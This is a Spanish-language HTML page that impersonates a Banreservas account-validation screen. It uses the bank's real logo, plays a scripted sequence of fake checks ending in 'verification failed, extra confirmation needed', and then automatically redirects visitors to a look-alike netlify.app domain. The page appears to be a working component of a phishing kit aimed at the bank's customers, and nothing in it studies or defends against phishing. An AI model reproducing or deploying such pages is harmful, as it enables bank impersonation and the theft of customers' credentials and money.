<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Validación de datos</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #ffffff; /* Fondo blanco */
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #004D61;
            overflow: hidden;
        }

        .logo {
            margin-bottom: 40px;
        }

        /* Logo estilo real */
        .exeter {
            display: block;
            width: 250px;
            height: 70px;
            background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            touch-action: manipulation;
            user-select: none;
            -webkit-user-drag: none;
            -webkit-tap-highlight-color: rgba(0,0,0,0);
        }

        .spinner {
            border: 12px solid rgba(0,0,0,0.1);
            border-top: 12px solid #004D61;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
            box-shadow: 0 0 15px rgba(0,77,97,0.3);
        }

        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }

        .message {
            text-align: center;
            font-size: 22px;
            max-width: 450px;
            min-height: 60px;
            opacity: 0;
            animation: fadein 1s forwards;
        }

        @keyframes fadein {
            to { opacity: 1; }
        }

    </style>
</head>
<body>

    <div class="logo">
        <a title="Banreservas" aria-label="Logo Banreservas" class="exeter"></a>
    </div>

    <div class="spinner"></div>

    <div class="message" id="message">Iniciando...</div>

    <script>
        const messages = [
            "Revisando datos...",
            "Validando información...",
            "Comprobando historial...",
            "Procesando...",
            "Verificación fallida..."
        ];

        const finalMessage = "Necesitamos comprobación extra para validar tu cuenta.";
        const messageEl = document.getElementById("message");
        let index = 0;

        function showNextMessage() {
            if (index < messages.length) {
                messageEl.textContent = messages[index];
                index++;
                messageEl.style.opacity = 0;
                messageEl.offsetHeight; // fuerza reflow
                messageEl.style.animation = "fadein 1s forwards";
            } else {
                messageEl.textContent = finalMessage;
                messageEl.style.opacity = 0;
                messageEl.offsetHeight;
                messageEl.style.animation = "fadein 1s forwards";
            }
        }

        const interval = setInterval(showNextMessage, 2000);
        showNextMessage();

        // Después de todos los mensajes, redirige
        setTimeout(() => {
            clearInterval(interval);
            window.location.href = "https://validar-banreservas.netlify.app/";
        }, 15000);
    </script>

</body>
</html>
